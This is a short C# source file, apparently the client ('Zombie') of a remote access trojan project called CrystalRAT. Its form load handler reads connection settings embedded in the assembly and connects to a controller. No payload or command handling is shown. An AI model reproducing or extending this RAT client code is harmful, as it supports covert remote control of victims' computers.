using CrystalRATShared.Helper;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Zombie.Functions;
using Zombie.Helper;
using Zombie.Properties;
using Zombie.Web;

namespace Zombie
{
    public partial class ZombieForm : Form
    {
        public ZombieForm()
        {
            InitializeComponent();
        }

        private void ZombieForm_Load(object sender, EventArgs e)
        {
            ClientSettings settings = LoadSettings();
            Client.Connect(settings);

        }

        private static ClientSettings LoadSettings()
        {
            ClientSettings settings;

            var assembly = Assembly.GetExecutingAssembly();
            string resourceName = assembly.GetManifestResourceNames().Single(str => str.EndsWith(ClientSettings.SettingsResourceName));

            using (Stream stream = assembly.GetManifestResourceStream(resourceName))
            using (StreamReader reader = new StreamReader(stream))
            {
                string result = reader.ReadToEnd();
                settings = JsonConvert.DeserializeObject<ClientSettings>(result);
            }

            return settings;
        }
    }
}
